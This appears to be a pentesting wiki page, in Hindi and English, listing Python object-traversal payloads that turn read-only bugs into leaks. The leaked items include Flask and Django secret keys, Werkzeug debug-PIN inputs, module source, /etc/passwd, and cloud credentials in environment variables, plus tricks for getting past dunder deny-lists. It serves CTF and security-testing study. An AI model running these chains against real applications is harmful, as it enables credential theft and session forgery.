# Python Internal Read Gadgets

## मूलभूत जानकारी

[**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) या [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) जैसी विभिन्न vulnerabilities आपको **python का internal data पढ़ने की अनुमति दे सकती हैं, लेकिन code execute करने की अनुमति नहीं देंगी**। इसलिए, एक pentester को इन read permissions का अधिकतम उपयोग करके **sensitive privileges प्राप्त करने और vulnerability को escalate करने** की आवश्यकता होगी।

### Flask - secret key पढ़ना

Flask application के main page में संभवतः **`app`** global object होगा, जहाँ यह **secret configure किया गया है**।
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
इस मामले में [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html) के किसी भी gadget का उपयोग करके **global objects को access** करना संभव है।

ऐसे मामले में जहाँ **vulnerability किसी अलग python file में हो**, आपको files को traverse करने के लिए एक gadget की आवश्यकता होगी, ताकि main file तक पहुँचकर **global object `app.secret_key` को access** किया जा सके और इस key को जानकर [**privileges escalate**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) किए जा सकें।

इस [writeup](https://ctftime.org/writeup/36082) से लिया गया payload इस तरह है:<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
इस payload का उपयोग **`app.secret_key` पढ़ने** के लिए करें। यदि मूल bug आपको write primitive (उदाहरण के लिए, class pollution) भी देता है, तो इसी path का उपयोग इसे बदलने और अधिक privileged Flask cookies को sign करने के लिए किया जा सकता है।

### Werkzeug - machine_id and node uuid

[**इस writeup से इन payload का उपयोग करके**](https://vozec.fr/writeups/tweedle-dum-dee/) आप **machine_id** और **uuid** node तक पहुंच सकेंगे, जो वे **private bits** हैं जिनकी आपको [**Werkzeug pin generate करने**](../../network-services-pentesting/pentesting-web/werkzeug.md) और `/console` में python console तक पहुंचने के लिए आवश्यकता है, यदि **debug mode enabled** है:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> ध्यान दें कि web page में कुछ **error** उत्पन्न करके आपको **app.py** का **server local path** मिल सकता है, जो आपको **path** दिखा देगा।

यदि vulnerability किसी अलग python file में है, तो main python file से objects access करने के लिए पिछले Flask trick को देखें।

### Django - SECRET_KEY और settings module

Application शुरू होने के बाद Django settings object को `sys.modules` में cache किया जाता है। केवल read primitives के साथ आप **SECRET_KEY**, fallback keys, database credentials या signing salts को leak कर सकते हैं:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
यदि vulnerable gadget किसी अन्य module में है, तो पहले globals पर जाएँ:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` वर्तमान `SECRET_KEY` जितने ही मूल्यवान हैं: rotation के दौरान वे अभी भी पुराने signed values को validate करते हैं।<sup>[[1]](#references)</sup> साथ ही `SESSION_ENGINE` और `SESSION_SERIALIZER` भी leak करें, ताकि जल्दी निर्धारित किया जा सके कि impact केवल cookie forgery तक सीमित है या कुछ अधिक शक्तिशाली है। Web impact के विवरण के लिए [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md) देखें।

### Module loader gadgets - source code और files पढ़ें

Loaded Python modules आमतौर पर एक `__loader__` रखते हैं। File-backed loaders अक्सर `get_source()` और `get_data()` expose करते हैं, जो **read-only primitives** के लिए perfect हैं, जब आप पहले से किसी module object तक पहुंच सकते हैं लेकिन `open()` तक नहीं:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
यह **config modules, blueprints, helper files या hidden routes** को dump करने और API keys, DSNs, flag paths या additional gadget entry points को recover करने के लिए बहुत उपयोगी है।

यदि आपके पास केवल subclass enumeration है, तो index को hard-code करने के बजाय loader को name से search करें:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

यदि आप कोई generator/coroutine object बना या उस तक पहुंच सकते हैं, तो उसका frame किसी भी function `__globals__` gadget की आवश्यकता के बिना globals को leak कर सकता है। यह उन filters के विरुद्ध उपयोगी है जो केवल dunder names को block करते हैं और `gi_frame`, `ag_frame`, `cr_frame` या `f_globals` जैसे frame attributes को भूल जाते हैं:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
जब आपके पास frame globals हों, तो अन्य gadgets (`sys.modules`, settings objects, `os.environ`, आदि) की तरह ही आगे बढ़ें। हाल के sandbox escapes में इसे बार-बार फिर से खोजा जा रहा है, क्योंकि `gi_frame` और `f_globals` dunder attributes नहीं हैं और अक्सर naive deny-lists से बचे रहते हैं।

### लोड किए गए modules के ज़रिए environment variables / cloud creds

कई jails अब भी कहीं न कहीं `os` या `sys` import करते हैं। आप किसी भी reachable function के `__init__.__globals__` का दुरुपयोग करके पहले से imported `os` module तक pivot कर सकते हैं और API tokens, cloud keys या flags वाले **environment variables** को dump कर सकते हैं:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
यदि subclass index filtered है, तो loaders का उपयोग करें:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Environment variables अक्सर read से full compromise तक पहुंचने के लिए आवश्यक एकमात्र secrets होते हैं (cloud IAM keys, database URLs, signing keys, आदि)।

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), प्रभावित versions `<0.61.0`) crafted component requests के माध्यम से **class pollution** की अनुमति देता था। `__init__.__globals__` जैसा property path component-module globals और imported modules तक पहुंच सकता था; advisory में Django की `SECRET_KEY` और `os.environ` में values को overwrite करना दिखाया गया है, न कि केवल read-only exploit।<sup>[[5]](#references)</sup> यदि कोई अलग bug उसी object graph तक read access प्रदान करता है, तो वे globals code execution की आवश्यकता के बिना configuration और credentials expose कर सकते हैं।

### Chaining के लिए gadget collections

Recent CTFs और pyjail research reliable read chains दिखाते हैं, जो केवल attribute access और subclass enumeration से बनाए गए हैं। Community-maintained lists जैसे [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) सैकड़ों minimal gadgets को catalog करती हैं, जिन्हें objects से `__globals__`, `sys.modules` और अंततः sensitive data तक traverse करने के लिए combine किया जा सकता है।<sup>[[2]](#references)</sup> Raw subclass indexes के बजाय **attribute/name based searches** को प्राथमिकता दें, क्योंकि `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` आदि की position Python versions के बीच और extra imported libraries के साथ बदलती रहती है।

## References

- [1] [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, Leading to RCE, XSS, DoS and Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
